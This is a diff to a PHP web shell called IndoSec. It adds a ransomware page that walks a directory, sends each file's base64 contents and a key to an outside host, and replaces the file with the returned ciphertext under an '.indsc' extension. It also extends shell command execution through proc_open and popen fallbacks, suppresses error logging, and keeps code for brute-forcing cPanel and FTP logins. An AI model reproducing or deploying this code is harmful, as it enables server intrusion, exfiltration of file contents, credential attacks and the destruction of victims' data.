@@ -28,26 +28,15 @@ error_reporting(0);
 @set_time_limit(0);
 @ignore_user_abort(0);
 @clearstatcache();
-
-
-if (@function_exists('ini_set')) {
-	@ini_set('error_log', NULL);
-	@ini_set('log_errors', 0);
-	@ini_set('max_execution_time', 0);
-	@ini_set('output_buffering', 0);
-	@ini_set('display_errors', 0);
-	@ini_set('memory_limit', '999999999M');
-	@ini_set('zlib.output_compression', 'Off');
-} else {
-	@ini_alter('error_log', NULL);
-	@ini_alter('log_errors', 0);
-	@ini_alter('max_execution_time', 0);
-	@ini_alter('output_buffering', 0);
-	@ini_alter('display_errors', 0);
-	@ini_alter('memory_limit', '999999999M');
-	@ini_alter('zlib.output_compression', 'Off');
-}
-
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+@ini_set('magic_quotes_runtime', 0);
+@ini_set('memory_limit', '-1');
+@ini_set("upload_max_filesize", "9999m");
+@ini_set('zlib.output_compression', 'Off');
 @ini_restore('safe_mode');
 @ini_restore("safe_mode_include_dir");
 @ini_restore("safe_mode_exec_dir");
@@ -59,7 +48,8 @@ if (@function_exists('ini_set')) {
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
 $isLocal 				= ($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1']));
-$mode					= $isLocal ? "debug" : "prod";
+// $mode					= $isLocal ? "debug" : "prod";
+$mode = "debug";
 $BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
@@ -128,6 +118,7 @@ function w($dir,$perm)
 function exe($cmd)
 {
 	$buff = '';
+	$cmd .= " 2>&1";
 
 	if(function_exists('system'))
     {
@@ -151,6 +142,29 @@ function exe($cmd)
     elseif(function_exists('shell_exec'))
     {
 		$buff = @shell_exec($cmd);
+	}
+	elseif(function_exists('proc_open'))
+	{
+		$desc = array(
+			0 => array("pipe", "r"),
+			1 => array("pipe", "w"),
+			2 => array("pipe", "w")
+		);
+
+		$proc = @proc_open($cmd, $desc, $pipes, getcwd(), array());
+		if(is_resource($proc)) {
+			while($res = fgets($pipes[1])) { if(!empty($res)) $buff .= $res; }
+			while($res = fgets($pipes[2])) { if(!empty($res)) $buff .= $res; }
+		}
+		@proc_close($proc);
+	}
+	elseif(function_exists('popen'))
+	{
+		$res = @popen($cmd, 'r');
+		if($res) {
+			while(!feof($res)) { $buff .= fread($res, 2096); }
+			pclose($res);
+		}
 	}
 	return $buff;
 }
@@ -343,7 +357,9 @@ function template($page, $bc, $search, $replace)
 {
 	
 	getContentPage("components/header");
+	getContentPage("components/sidebar");
 	getContentPage("components/rightpanel");
+	
 	breadcrumb($bc);
 	getContentPage($page, $search, $replace);
 	getContentPage("components/footer", $search, $replace);
@@ -538,10 +554,22 @@ function curlRequestCrack($info)
 	curl_close($ch);
 
 	if ($curl_errno > 0) {return "<font color='red'>Error: $curl_error</font><br>";}
-	elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
-	elseif(preg_match('/filemanager/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
-	elseif(preg_match('/(\d+):(\d+)/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	else if(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	else if(preg_match('/filemanager/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	else if(preg_match('/(\d+):(\d+)/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
 	
+}
+
+function curlRequestRansom($content, $key)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://ransom.rizsyad.repl.co");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_POST, true);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "content=$content&action=enc&key=$key");
+	$result = curl_exec($ch);
+	curl_close($ch);
+	return $result;
 }
 
 function crackFunctionLogin($info){
@@ -551,16 +579,12 @@ function crackFunctionLogin($info){
 		{
 			return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
 		}
-	} else 
+	} 
+	
+	if($con=@ftp_connect($info['url'],$info['port']))
 	{
-		if($con=@ftp_connect($info['url'],$info['port']))
-		{
-			if($con)
-			{
-				$login=@ftp_login($con,$info['username'],$info['password']);
-				if($login) return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-			}
-		}
+		$login=@ftp_login($con,$info['username'],$info['password']);
+		if($login) return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
 	}
 }
 
@@ -584,6 +608,38 @@ function searchString($method, $dir, $string, $ext, $exclude, &$output = array()
 				if(strpos($content, $string) !== false) $output[] = str_replace('\\','/',$path);
 			} else {
 				if(strstr($file, $string)) $output[] = str_replace('\\','/',$path);
+			}
+		}
+	}
+	return $output;
+}
+
+function ransom($dir, $key, &$output = array())
+{
+	$exclude = basename(__FILE__).", ";
+
+		
+	if(is_dir($dir)) {
+		$scdir = scandir($dir);
+		foreach($scdir as $file) {
+			$path = realpath($dir.DIRECTORY_SEPARATOR.$file);
+			
+			if($file == "." || $file == ".." || in_array($file, array_map("trim", explode(",", $exclude)))) continue;
+			if(is_dir($path)) ransom($path, $key, $output);
+
+			$contentFile = file_get_contents($path);
+			$base64 = base64_encode($contentFile);
+			$result = json_decode(curlRequestRansom($base64, $key));
+
+			if($result->status == "success") {
+				if(is_dir($path)) continue;
+
+				if(rename($path, $path. ".indsc")) {
+					file_put_contents($path. ".indsc", $result->data);
+					$output[] = "[+] <i class='fa-solid fa-lock'></i> $path => Success Encrypted <br>";
+				} else {
+					$output[] = "[+] <i class='fa-solid fa-lock'></i> $path => Failed Encrypted <br>";
+				}
 			}
 		}
 	}
@@ -619,9 +675,9 @@ function newfolder(){
 	{
 		$name = $_POST['nama_folder'];
 		$fd = @mkdir($name);
-		if($fd) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));
+		if($fd) return swall("Success", "Berhasil Membuat Folder", "success", current_path("filemanager", $path));
 
-		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
+		return swall("Success","Gagal Membuat Folder", "success", current_path("filemanager", $path));
 	}
 }
 
@@ -654,33 +710,13 @@ function renameF()
 
 	if(isset($_POST['rename']))
 	{
-		$lama = $path;
 		$baru = $_POST['new'];
-		
-		if(is_dir($lama))
-		{
-			$ubah = rename($lama, dirname($lama)."/".$baru);
-		}
-		else
-		{
-			
-			if(file_exists($baru)) 
-			{
-				$path = dirname($lama);
-				return swall("Error", "Nama $baru Telah Digunakan", "error",  current_path("filemanager", $path));
-			} 
 
-			$ubah = rename($lama, $baru);
-		}
+		if(file_exists(dirname($path)."/".$baru)) return swall("Error", "Nama $baru Telah Digunakan", "error",  current_path("filemanager", $path));
+		$ubah = rename($path, dirname($path)."/".$baru);
 
-		if($ubah) 
-		{
-			$path = dirname($lama);
-			return swall("Success", "Berhasil Mengganti Nama Menjadi $baru", "success",  current_path("filemanager", $path));
-		} 
-
-		$path = dirname($lama);
-		swall("Error", "Gagal Mengganti Nama", "error", current_path("filemanager", $path));
+		if($ubah) return swall("Success", "Berhasil Mengganti Nama Menjadi $baru", "success",  current_path("filemanager", dirname($path)));
+		swall("Error", "Gagal Mengganti Nama", "error", current_path("filemanager", dirname($path)));
 	}
 }
 
@@ -948,8 +984,7 @@ function dashboard() {
 		"{{COUNTRY}}",
 		"{{RANKCOUNTRY}}",
 		"{{DARANK}}",
-		"{{PARANK}}",
-		"{{AUTOROOT}}"
+		"{{PARANK}}"
 	];
 
 	$arrReplace = [ 
@@ -1100,6 +1135,24 @@ function search(){
 	}
 }
 
+function ransomware() {
+	global $path;
+
+	$search = array("{{DIR}}", "{{OUTPUT}}");
+	$replace = array($path, "");
+
+	if(isset($_POST["path"]) && isset($_POST["key"])) {
+		
+		$output = ransom($_POST["path"], $_POST["key"]);
+		
+		$replace[1] = implode(' ', $output);
+
+		pages("ransomware", ["Tools", "Ransomware"], $search, $replace);
+	} else {
+		pages("ransomware", ["Tools", "Ransomware"], $search, $replace);
+	}
+}
+
 if(isset($_GET["page"]))
 {
 	$page = $_GET["page"];
@@ -1128,6 +1181,7 @@ if(isset($_GET["page"]))
 	if($page == "adminer") adminer();
 	if($page == "network") network();
 	if($page == "bruteforce") bruteforce();
+	if($page == "ransomware") ransomware();
 
 	// Info
 	if($page == "about") pages($page, ["About"]);
